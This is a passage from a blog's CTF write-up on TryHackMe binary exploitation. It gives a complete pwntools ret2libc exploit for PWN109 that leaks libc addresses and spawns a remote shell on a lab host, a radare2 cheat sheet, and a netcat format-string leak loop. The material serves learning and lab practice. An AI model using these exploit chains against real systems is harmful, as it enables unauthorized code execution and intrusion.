</pre></table></code></div></div><h1 id="pwn109---stack-bof---ret2libc">PWN109 - Stack BOF - Ret2Libc</h1><blockquote><p>The challenge is running on port 9009</p></blockquote><p>Let’s download the binary and start it. Binary throws an <code class="language-plaintext highlighter-rouge">Segmentation fault</code> error if we add longer input</p><p><img data-src="/assets/images/4e410b179f06a242353e55772eb72950ee272489ec765b3299f3f2bb151e5381.png" alt="picture 72" data-proofer-ignore></p><h2 id="file-and-checksec-1">File and Checksec<a href="#file-and-checksec-1" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p><img data-src="/assets/images/2db56218634773d699cce489006bf3e5510bceb783f12f42c1b39d23627ed742.png" alt="picture 73" data-proofer-ignore></p><h2 id="analysis-4">Analysis<a href="#analysis-4" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="cutter-dissasembly">Cutter Dissasembly<a href="#cutter-dissasembly" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p><img data-src="/assets/images/739cb0687105ab0374753bc3371bb28ac35f7bf439a8f9d7b6a563f01f56182d.png" alt="picture 74" data-proofer-ignore></p><p>There are no other functions of our interest.</p><p>Vulnerable function <code class="language-plaintext highlighter-rouge">gets</code> is vulnerable to buffer overflow and is located at <code class="language-plaintext highlighter-rouge">rbp-0x20</code>. As there are no other functions, we need to leak libc address which has system function in it. to actually leak that, we’d need to use another function, like <code class="language-plaintext highlighter-rouge">puts</code> for which the offset is known</p><p><img data-src="/assets/images/e3779c65fe0dbecc322d588fa5fb019c3c0bdc403403346e51682019831a767b.png" alt="picture 75" data-proofer-ignore></p><p>As return to the main function will be necessary, we need gadgets to do that. I’ll strictly be following Razvi in his video https://www.youtube.com/watch?v=TTCz3kMutSs&amp;t=850s and use ROPgadget to search for them.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>ROPgadget --binary ./pwn109.pwn109 --depth 12 &gt; gadgets.txt
</pre></table></code></div></div><p>As 64-bit saves data to registers (first one is RDI), the Gadget should do exactly that. E.g.,</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>0x00000000004012a3 : pop rdi ; ret
</pre></table></code></div></div><h2 id="leaking-the-addresses-from-stack">Leaking the addresses from stack<a href="#leaking-the-addresses-from-stack" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>This script prints the values of all three functions</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./pwn109.pwn109"</span><span class="p">,</span><span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>

<span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00000000004012a3</span><span class="p">)</span>
<span class="n">ret</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x000000000040101a</span><span class="p">)</span>
<span class="n">plt_puts</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">binary</span><span class="p">.</span><span class="n">plt</span><span class="p">.</span><span class="n">puts</span><span class="p">)</span>
<span class="n">got_puts</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">binary</span><span class="p">.</span><span class="n">got</span><span class="p">.</span><span class="n">puts</span><span class="p">)</span>
<span class="n">got_gets</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">binary</span><span class="p">.</span><span class="n">got</span><span class="p">.</span><span class="n">gets</span><span class="p">)</span>
<span class="n">got_setvbuf</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">binary</span><span class="p">.</span><span class="n">got</span><span class="p">.</span><span class="n">setvbuf</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x20</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"B"</span><span class="o">*</span><span class="mh">0x8</span>
<span class="c1"># We need to define what to actually print. Mind that data is stored in RDI, then the GOT Address and plt PUTS at last
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">pop_rdi_ret</span> <span class="o">+</span> <span class="n">got_puts</span> <span class="o">+</span> <span class="n">plt_puts</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">pop_rdi_ret</span> <span class="o">+</span> <span class="n">got_gets</span> <span class="o">+</span> <span class="n">plt_puts</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">pop_rdi_ret</span> <span class="o">+</span> <span class="n">got_setvbuf</span> <span class="o">+</span> <span class="n">plt_puts</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">()</span>
<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"ahead"</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">out</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">().</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>

<span class="n">leaked_puts_address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">out</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
<span class="n">leaked_gets_address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">out</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
<span class="n">leaked_setvbuf_address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">out</span><span class="p">[</span><span class="mi">2</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>

<span class="k">print</span><span class="p">(</span><span class="s">"Leaked PUTS Address: {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">leaked_puts_address</span><span class="p">))))</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Leaked GETS Address: {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">leaked_gets_address</span><span class="p">))))</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Leaked SETVBUF Address: {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">leaked_setvbuf_address</span><span class="p">))))</span>

<span class="c1">#p.interactive()
</span></pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>luka@yurei:~/Desktop/thm/pwn109$ python3 pwn109.py 
[+] Starting local process '/home/luka/Desktop/thm/pwn109/pwn109.pwn109': pid 105549
Leaked PUTS Address: 0x7fee0cd3ced0
Leaked GETS Address: 0x7fee0cd3c5a0
Leaked SETVBUF Address: 0x7fee0cd3d670
</pre></table></code></div></div><p>If i check remotely, the end addresses of the last 3 nibbles are always the same.</p><p><img data-src="/assets/images/78851e5717a3ad93450670f5ffbac5c5c21b7fc8a68bfdf86f9473b61174f877.png" alt="picture 76" data-proofer-ignore></p><p>We can determine which libc has been used, even online on like https://libc.tip or https://libc.nullbyte.cat which already displays offsets!</p><p><img data-src="/assets/images/014a835c552cd9fb420471450a780bd2497e05a63047a7426220af5db73a0464.png" alt="picture 77" data-proofer-ignore></p><p>Final Exploit</p><div class="language-python highlighter-rouge"><div class="code-header"> <span label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./pwn109.pwn109"</span><span class="p">,</span><span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>

<span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00000000004012a3</span><span class="p">)</span>
<span class="n">ret</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x000000000040101a</span><span class="p">)</span>

<span class="n">main</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">binary</span><span class="p">.</span><span class="n">symbols</span><span class="p">.</span><span class="n">main</span><span class="p">)</span>
<span class="n">plt_puts</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">binary</span><span class="p">.</span><span class="n">plt</span><span class="p">.</span><span class="n">puts</span><span class="p">)</span>
<span class="n">got_puts</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">binary</span><span class="p">.</span><span class="n">got</span><span class="p">.</span><span class="n">puts</span><span class="p">)</span>
<span class="n">got_gets</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">binary</span><span class="p">.</span><span class="n">got</span><span class="p">.</span><span class="n">gets</span><span class="p">)</span>
<span class="n">got_setvbuf</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">binary</span><span class="p">.</span><span class="n">got</span><span class="p">.</span><span class="n">setvbuf</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x20</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"B"</span><span class="o">*</span><span class="mh">0x8</span>
<span class="c1"># We need to define what to actually print. Mind that data is stored in RDI, then the GOT Address and plt PUTS at last
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">pop_rdi_ret</span> <span class="o">+</span> <span class="n">got_puts</span> <span class="o">+</span> <span class="n">plt_puts</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">pop_rdi_ret</span> <span class="o">+</span> <span class="n">got_gets</span> <span class="o">+</span> <span class="n">plt_puts</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">pop_rdi_ret</span> <span class="o">+</span> <span class="n">got_setvbuf</span> <span class="o">+</span> <span class="n">plt_puts</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">main</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">()</span>
<span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s">"10.10.178.191"</span><span class="p">,</span> <span class="mi">9009</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"ahead"</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="n">out</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recvall</span><span class="p">().</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>

<span class="c1"># u64 does the opposite what p64 does. It unpacs from little endian 64bit
</span><span class="n">leaked_puts_address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">out</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
<span class="n">leaked_gets_address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">out</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>
<span class="n">leaked_setvbuf_address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">out</span><span class="p">[</span><span class="mi">2</span><span class="p">].</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="p">))</span>

<span class="k">print</span><span class="p">(</span><span class="s">"Leaked PUTS Address: {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">leaked_puts_address</span><span class="p">))))</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Leaked GETS Address: {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">leaked_gets_address</span><span class="p">))))</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Leaked SETVBUF Address: {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">leaked_setvbuf_address</span><span class="p">))))</span>

<span class="c1"># 2nd stage where we return to the main function, exploit gets once again and return to libc system to spawn a shell. Offsets below were gotten from libc.nullbyte.cat
</span><span class="s">'''
	system	0x04f550	-0x30c40
	gets	0x080190	0x0
	puts	0x080aa0	0x910
	setvbuf	0x0813d0	0x1240
	open	0x10fd10	0x8fb80
	read	0x110140	0x8ffb0
	write	0x110210	0x90080
	str_bin_sh	0x1b3e1a	0x133c8a
'''</span>

<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mh">0x20</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">"B"</span><span class="o">*</span><span class="mh">0x8</span>

<span class="c1"># ubuntu needs ret!
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">ret</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">pop_rdi_ret</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">leaked_gets_address</span> <span class="o">+</span> <span class="mh">0x133c8a</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">leaked_gets_address</span> <span class="o">-</span> <span class="mh">0x30c40</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></table></code></div></div><h1 id="pwn110---todo">PWN110 - todo</h1><p>I’ve decided to do PWN110 at some later time, as i’ve not felt ready to build my own ROP Chains ;)</p><h1 id="radare2-cheatsheet">RADARE2 CheatSheet</h1><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
</pre><td class="rouge-code"><pre># Start radare2
r2 -R stdin=payload -d -A ./babyecho

# disas
pdf @ main

# Set breakpoints, e.g., before and after the call
db 0x12312312

#prints stack at address
pxr @ 0xadresscomeshere

# Print section
pxr @ section..got.plt

#prints string at adress
ps @ 0xaddresscomeshere

#prints 30 bytes from rsp
pxr 30 @ rsp

#print registers
dr

#prints current section
iS.

#execution continue
dc

# Continue for 1 command
ds

-   `pxa @ rsp` - to show annotated hexdump
-   `pxw @ rsp` - to show hexadecimal words dump (32bit)
-   `pxq @ rsp` - to show hexadecimal quad-words dump (64bit)
-   `ad@r:SP` - to analyze the stack data
# Restart program
oo

# Display vaariables
avfd
.afvd local_4h
</pre></table></code></div></div><h1 id="random-scripts">Random Scripts</h1><h2 id="leak-addresses---format-string-vuln">Leak addresses - format string vuln<a href="#leak-addresses---format-string-vuln" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>for i in `seq 1 20`; do timeout 1 echo -e "%$i\$lX" | nc -q 1 10.10.42.49 9007 | grep "Your current streak:";done
</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/binary-exploitation/'>Binary Exploitation</a>, <a href='/categories/ctf/'>CTF</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/notes/" class="post-tag no-text-decoration" >Notes</a> <a href="/tags/binary-exploitation/" class="post-tag no-text-decoration" >Binary Exploitation</a> <a href="/tags/ctf/" class="post-tag no-text-decoration" >CTF</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=(TryHackMe) - PWN101 - CyberSec-Research.Space&url=https://an9k0r.github.io/posts/THM_binexp_pwn101/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=(TryHackMe) - PWN101 - CyberSec-Research.Space&u=https://an9k0r.github.io/posts/THM_binexp_pwn101/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=(TryHackMe) - PWN101 - CyberSec-Research.Space&url=https://an9k0r.github.io/posts/THM_binexp_pwn101/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/insecure_deserialization/">(Portswigger/WebAcademy) - Insecure Deserialization vulnerabilities</a><li><a href="/posts/ssti/">(Portswigger/WebAcademy) - Server-Side Template Injection vulnerabilities</a><li><a href="/posts/stored_XSS/">(Portswigger/WebAcademy) - Stored Cross-Site Scripting (XSS)</a><li><a href="/posts/Blind_SQL_Injection/">Blind SQL Injection</a><li><a href="/posts/OS_Command_Injection/">OS Command Injection</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/notes/">Notes</a> <a class="post-tag" href="/tags/portswigger/">Portswigger</a> <a class="post-tag" href="/tags/web-application/">Web Application</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/clear-text-credentials/">Clear Text Credentials</a> <a class="post-tag" href="/tags/password-reuse/">Password Reuse</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/deserialization/">Deserialization</a> <a class="post-tag" href="/tags/misconfiguration/">Misconfiguration</a> <a class="post-tag" href="/tags/password-cracking/">Password Cracking</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/websockets/"><div class="card-body"> <em class="timeago small" date="2023-01-15 08:00:00 +0100" >Jan 15</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>(Portswigger/WebAcademy) - Websockets</h3><div class="text-muted small"><p> Intro This post/writeup is all about the insecure deserialization vulnerabilities. I’ll be using primarily Portswigger Web Academy Labs, but i do intent do throw other labs and writeups here as we...</p></div></div></a></div><div class="card"> <a href="/posts/DOM_based_vulns/"><div class="card-body"> <em class="timeago small" date="2023-01-15 08:00:00 +0100" >Jan 15</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>(Portswigger/WebAcademy) - DOM-based Vulnerabilities</h3><div class="text-muted small"><p> Intro This post/writeup is all about the DOM-based Vulnerabilitiess. I’ll be using primarily Portswigger Web Academy Labs, but i do intent do throw other labs and writeups here as well. To learn ...</p></div></div></a></div><div class="card"> <a href="/posts/stored_XSS/"><div class="card-body"> <em class="timeago small" date="2023-01-25 08:00:00 +0100" >Jan 25</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>(Portswigger/WebAcademy) - Stored Cross-Site Scripting (XSS)</h3><div class="text-muted small"><p> Intro This post/writeup is all about the stored XSS Vulnerabilities. I’ll be using primarily Portswigger Web Academy Labs, but i do intent do throw other labs and writeups here as well. To learn ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Server-side_request_forgery/" class="btn btn-outline-primary" prompt="Older"><p>(Portswigger/WebAcademy) - Server-side request forgery (SSRF)</p></a> <a href="/posts/XXE_Injection/" class="btn btn-outline-primary" prompt="Newer"><p>(Portswigger/WebAcademy) - XXE Injection</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/cybersec_space">eng4ge</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/notes/">Notes</a> <a class="post-tag" href="/tags/portswigger/">Portswigger</a> <a class="post-tag" href="/tags/web-application/">Web Application</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/clear-text-credentials/">Clear Text Credentials</a> <a class="post-tag" href="/tags/password-reuse/">Password Reuse</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/deserialization/">Deserialization</a> <a class="post-tag" href="/tags/misconfiguration/">Misconfiguration</a> <a class="post-tag" href="/tags/password-cracking/">Password Cracking</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><script src="https://cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js"></script> <script> $(function() { function updateMermaid(event) { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { const mode = event.data.message; if (typeof mermaid === "undefined") { return; } let expectedTheme = (mode === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* Re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } let initTheme = "default"; if ($("html[mode=dark]").length > 0 || ($("html[mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches ) ) { initTheme = "dark"; } let mermaidConf = { theme: initTheme /* <default|dark|forest|neutral> */ }; /* Markdown converts to HTML */ $("pre").has("code.language-mermaid").each(function() { let svgCode = $(this).children().html(); $(this).addClass("unloaded"); $(this).after(`<div class=\"mermaid\">${svgCode}</div>`); }); mermaid.initialize(mermaidConf); window.addEventListener("message", updateMermaid); }); </script><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script> /* see: <https://docs.mathjax.org/en/latest/options/input/tex.html#tex-options> */ MathJax = { tex: { inlineMath: [ /* start/end delimiter pairs for in-line math */ ['$','$'], ['\\(','\\)'] ], displayMath: [ /* start/end delimiter pairs for display math */ ['$$', '$$'], ['\\[', '\\]'] ] } }; </script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript" id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"> </script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script>
